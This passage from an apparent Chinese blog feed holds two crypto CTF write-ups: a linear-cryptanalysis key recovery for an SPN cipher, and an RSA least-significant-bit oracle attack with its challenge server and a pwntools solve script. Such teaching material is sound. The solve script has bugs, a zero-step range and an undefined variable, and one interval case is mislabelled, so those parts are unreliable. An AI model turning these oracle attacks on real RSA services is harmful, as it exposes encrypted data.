class="string">'P'</span>)</div><div class="line">U4 = sympy.IndexedBase(<span class="string">'U4'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">k</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="comment"># not interested in which key bits are involved</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(i, b)</span>:</span></div><div class="line">    <span class="comment"># plain-text bits</span></div><div class="line">    <span class="keyword">return</span> P[i, b]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</div><div class="line">        <span class="comment"># this is the input of the last S-box, leave it as it is</span></div><div class="line">        <span class="keyword">return</span> U4[j, b]</div><div class="line">    <span class="comment"># These numbers are from the S-box biases where there is only a single input bit involved, map them to output bits</span></div><div class="line">    <span class="keyword">return</span> sum(map(<span class="keyword">lambda</span> x: v(i, j, x), [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>], [<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], [<span class="number">1</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">4</span>]][b]))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">v</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="comment"># From the output of an S-box we can get to the input of the next S-box by using the permutations (and some key bits)</span></div><div class="line">    <span class="keyword">return</span> k(i+<span class="number">1</span>, pt[j][b][<span class="number">0</span>], pt[j][b][<span class="number">1</span>])+u(i+<span class="number">1</span>, pt[j][b][<span class="number">0</span>], pt[j][b][<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">x</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="comment"># Input of the first S-box is the plaintext bit ^ a key bit</span></div><div class="line">    <span class="keyword">return</span> p(<span class="number">0</span>, i)+k(<span class="number">1</span>, <span class="number">0</span>, i)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">y</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="comment"># Output of the first S-box</span></div><div class="line">    <span class="keyword">return</span> v(<span class="number">1</span>, <span class="number">0</span>, i)</div><div class="line"></div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">6</span>)+y(<span class="number">0</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">5</span>)+x(<span class="number">6</span>)+y(<span class="number">1</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+y(<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">6</span>)+x(<span class="number">7</span>)+y(<span class="number">3</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">6</span>)+x(<span class="number">7</span>)+y(<span class="number">4</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">4</span>)+x(<span class="number">7</span>)+y(<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+y(<span class="number">6</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">5</span>)+y(<span class="number">7</span>)</div></pre></td></tr></table></figure>
<p>获得表达式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[1, 0] + U4[1, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 1] + P[0, 6] + P[0, 7] + U4[0, 0] + U4[0, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[6, 0] + U4[6, 4]</div><div class="line">P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + P[0, 7] + U4[1, 0] + U4[1, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[5, 0] + U4[5, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 1] + P[0, 2] + P[0, 4] + P[0, 7] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[6, 0] + U4[6, 4]</div><div class="line">P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + U4[3, 0] + U4[3, 4] + U4[7, 0] + U4[7, 4]</div></pre></td></tr></table></figure>
<p>最后我们看看上面的表达式，我们能够爆破的只有两个字节，因此应该选择合适的表达式进行展开。</p>
<p>由于性能的要求，这里使用的是c语言（这里用的是倒数第2个表达式）：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> sbox_inv[<span class="number">256</span>] = &#123;<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>&#125;;</div><div class="line"><span class="keyword">int</span> cnt[<span class="number">256</span>][<span class="number">256</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bit</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> (n &amp; (<span class="number">1</span> &lt;&lt; k)) != <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">auto</span> f = fopen(<span class="string">"data"</span>, <span class="string">"rb"</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">65536</span>; i++) &#123;</div><div class="line">        <span class="keyword">uint8_t</span> p[<span class="number">8</span>], c[<span class="number">8</span>];</div><div class="line">        fread(&amp;p, <span class="number">8</span>, <span class="number">1</span>, f);</div><div class="line">        fread(&amp;c, <span class="number">8</span>, <span class="number">1</span>, f);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">256</span>; a++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">256</span>; b++) &#123;</div><div class="line">                <span class="keyword">int</span> u4b0 = sbox_inv[(<span class="keyword">int</span>)c[<span class="number">0</span>] ^ a], u4b6 = sbox_inv[(<span class="keyword">int</span>)c[<span class="number">6</span>] ^ b];</div><div class="line">                <span class="keyword">if</span> (bit(p[<span class="number">0</span>], <span class="number">0</span>) ^ bit(p[<span class="number">0</span>], <span class="number">3</span>) ^ bit(p[<span class="number">0</span>], <span class="number">4</span>) ^ bit(u4b0, <span class="number">0</span>) ^ bit(u4b0, <span class="number">4</span>)</div><div class="line">                  ^ bit(u4b6, <span class="number">0</span>) ^ bit(u4b6, <span class="number">4</span>)) &#123;</div><div class="line">                    cnt[a][b]++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">256</span>; a++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">256</span>; b++) &#123;</div><div class="line">            <span class="keyword">int</span> bias = <span class="built_in">abs</span>(cnt[a][b] - <span class="number">32768</span>);</div><div class="line">            <span class="keyword">if</span> (bias &gt; <span class="number">1000</span>)</div><div class="line">                <span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="string">" "</span> &lt;&lt; b &lt;&lt; <span class="string">" "</span> &lt;&lt; bias &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">130 103 1068</div><div class="line">130 118 1044</div><div class="line">130 194 2220</div><div class="line">130 196 1111</div><div class="line">130 213 1068</div><div class="line">149 194 1045</div></pre></td></tr></table></figure>
<p>于是我们可以认为最后1轮中，第0字节为130，第6个字节是194。</p>
<p>当然我们可用类似的办法求出另外一些字节：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def inv(rnd, r5):</div><div class="line">    r4b = bytearray(r5[i]^r5[4+i] for i in xrange(4))</div><div class="line">    r4a = bytearray(r5[i]^sbox[r4b[(i+1)%4]] ^ (rcon[rnd] if i == 0 else 0) for i in xrange(4))</div><div class="line">    return r4a + r4b</div><div class="line"></div><div class="line">r5 = bytearray([130, 167, 150, 65, 235, 239, 194, 40])</div><div class="line">r4 = inv(4, r5)</div><div class="line">r3 = inv(3, r4)</div><div class="line">r2 = inv(2, r3)</div><div class="line">r1 = inv(1, r2)</div><div class="line">print &apos;flag&#123;%s&#125;&apos;%(str(r1).encode(&apos;hex&apos;))</div></pre></td></tr></table></figure>
<p>最终的flag为flag{48667ec1a5fb3383}</p>
<h3 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05 引用"></a>0x05 引用</h3><p><a href="https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf" target="_blank" rel="external">https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf</a></p>
<p><a href="https://gist.github.com/ngg/f534e51c14a832d69c41289837078773" target="_blank" rel="external">https://gist.github.com/ngg/f534e51c14a832d69c41289837078773</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h3&gt;&lt;p&gt;线性分析法、差分分析法作为SPN(Substitution Permutation Network)
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="spn" scheme="http://yoursite.com/tags/spn/"/>
    
  </entry>
  
  <entry>
    <title>RSA Least-Significant-Bit Oracle Attack</title>
    <link href="http://yoursite.com/2018/03/27/RSA-Least-Significant-Bit-Oracle-Attack/"/>
    <id>http://yoursite.com/2018/03/27/RSA-Least-Significant-Bit-Oracle-Attack/</id>
    <published>2018-03-27T09:18:35.000Z</published>
    <updated>2018-03-27T11:34:02.228Z</updated>
    
    <content type="html"><![CDATA[<p>此攻击方式是从<a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack" target="_blank" rel="external">rsa-least-significant-bit-oracle-attack</a> 看到的，刚好用于Backdoor CTF的一道密码学的题目！</p>
<h3 id="0x1-问题描述"><a href="#0x1-问题描述" class="headerlink" title="0x1 问题描述"></a>0x1 问题描述</h3><p>假如用户知道公钥中$N,e,c$，并且可以任意构造密文$c_1$，返回此密文解密后$p_1$的末尾某些比特位的性质（记为函数$f$），求原始明文信息！</p>
<p>最简单的函数$f$ 是表示 $p_1$ 的奇偶性。</p>
<h3 id="0x2-原理"><a href="#0x2-原理" class="headerlink" title="0x2 原理"></a>0x2 原理</h3><p>攻击者得到密文$C=P^e(mod\ n)$ ，将其乘以$2^e(mod\ N)$, 并作为密文发送出去，若返回$f(2P)$</p>
<blockquote>
<p>如果$f(2P)$ 返回的最后一位是0，那么$2P&lt;N$，即$P&lt;N/2$</p>
<p>如果$f(2P)$ 返回的最后一位是1，那么$2P&gt;N$，即 $P&gt;N/2$</p>
</blockquote>
<p>接着我们来看看$2P$ 和 $4P$</p>
<blockquote>
<p>如果返回的是（偶，偶），那么有 $P&lt;N/4$</p>
<p>如果返回的是（偶，奇），那么有$N/4&lt;P&lt;N/2$</p>
<p>如果返回的是（偶，奇），那么有$N/2&lt;P&lt;3N/4$</p>
<p>如果返回的是（奇，奇），那么有$3N/4&lt;P&lt;N$</p>
</blockquote>
<p>从这里基本上就可以找到规律了，如果我们循环下去，基本上就可以得到P所处在的空间。当次数不断叠加，最终所处在的空间将会十分的小，于是就可以解出对应的解！</p>
<h3 id="0x3-方法"><a href="#0x3-方法" class="headerlink" title="0x3 方法"></a>0x3 方法</h3><p>$P\in[0,P]$ 也即$LB=0$， $UB=N$</p>
<p>使用$log_2\ N$ 次可以根据密文$C$ 求解出明文$P$</p>
<p>$C&#39;=(2^e\ mod\ N)*C$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (Oracle(C&apos;) == even)</div><div class="line">    UB = (UB + LB)/2;</div><div class="line">else</div><div class="line">    LB = (UB + LB)/2;</div></pre></td></tr></table></figure>
<h3 id="0x4-实例"><a href="#0x4-实例" class="headerlink" title="0x4 实例"></a>0x4 实例</h3><p>Backdoor CTF 2018 题目 BIT-LEAKER</p>
<p>service.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python -u</span></div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="comment">#from SECRET import flag</span></div><div class="line">flag = <span class="string">"CTF&#123;this_is_my_test_flag&#125;"</span></div><div class="line">m = bytes_to_long(flag)</div><div class="line"></div><div class="line">key = RSA.generate(<span class="number">1024</span>)</div><div class="line"></div><div class="line">c = pow(m, key.e, key.n)</div><div class="line">print(<span class="string">"Welcome to BACKDOORCTF17\n"</span>)</div><div class="line">print(<span class="string">"PublicKey:\n"</span>)</div><div class="line">print(<span class="string">"N = "</span> + str(key.n) + <span class="string">"\n"</span>)</div><div class="line">print(<span class="string">"e = "</span> + str(key.e) + <span class="string">"\n"</span>)</div><div class="line">print(<span class="string">"c = "</span> + str(c) + <span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        temp_c = int(raw_input(<span class="string">"temp_c = "</span>))</div><div class="line">        temp_m = pow(temp_c, key.d, key.n)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line">    l = str(((temp_m&amp;<span class="number">5</span>) * random.randint(<span class="number">1</span>,<span class="number">10000</span>))%(<span class="number">2</span>*(random.randint(<span class="number">1</span>,<span class="number">10000</span>))))</div><div class="line">    <span class="keyword">print</span> <span class="string">"l = "</span>+l</div></pre></td></tr></table></figure>
<p>solve.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">#/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">import libnum</div><div class="line">import Crypto</div><div class="line">import re</div><div class="line">from binascii import hexlify,unhexlify</div><div class="line"></div><div class="line">if len(sys.argv)&gt;1:</div><div class="line">    p=remote(&quot;127.0.0.1&quot;,2334)</div><div class="line">else:</div><div class="line">    p=remote(&apos;127.0.0.1&apos;,2333)</div><div class="line"></div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">def oracle(c):</div><div class="line">    l = []</div><div class="line">    for i in range(20):</div><div class="line">        p.sendline(str(c))</div><div class="line">        s = p.recvuntil(&quot;temp_c&quot;)</div><div class="line">        l.append(int(re.findall(&quot;l\s*=\s*([0-9]*)&quot;,s)[0]))</div><div class="line">    flag0 = 0</div><div class="line">    flag2 = 0</div><div class="line">    for i in range(20):</div><div class="line">        if l[i]%2 != 0:</div><div class="line">            flag0 = 1</div><div class="line">        if l[i] &gt; 10000:</div><div class="line">            flag2 = 1</div><div class="line">    return [flag2,flag0]</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    ss = p.recvuntil(&quot;temp_c&quot;)</div><div class="line">    N = int(re.findall(&quot;N\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    e = int(re.findall(&quot;e\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    c = int(re.findall(&quot;c\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    size = libnum.len_in_bits(N)</div><div class="line">    print &quot;N=&quot;,N</div><div class="line">    print &quot;e=&quot;,e</div><div class="line">    print &quot;c=&quot;,c</div><div class="line">    c = (pow(2,e,N)*c)%N</div><div class="line">    LB = 0</div><div class="line">    UB = N</div><div class="line">    i = 1</div><div class="line">    while LB!=UB:</div><div class="line">        flag = oracle(c)</div><div class="line">        print i,flag</div><div class="line">        if flag[1]%2==0:</div><div class="line">            UB = (LB+UB)/2</div><div class="line">        else:</div><div class="line">            LB = (LB+UB)/2</div><div class="line">        c = (pow(2,e,N)*c)%N</div><div class="line">        i += 1</div><div class="line">    print LB</div><div class="line">    print UB</div><div class="line">    for i in range(-128,128,0):</div><div class="line">        LB += i</div><div class="line">        if pow(LB,e,N)==C:</div><div class="line">            print unhexlify(hex(LB)[2:-1])</div><div class="line">            exit(0)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<p>这道题有个问题，就是远程比较慢，所以可能需要很长时间！</p>
<p>另外就是算法的正确度不能保证，所以可能需要中途断开，多跑几次！</p>
<p>还有就是这个算法因为都是整除运算，导致的最终结果可能有一定误差！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此攻击方式是从&lt;a href=&quot;https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://yoursite.com/tags/rsa/"/>
    
  </entry>
  
</feed>
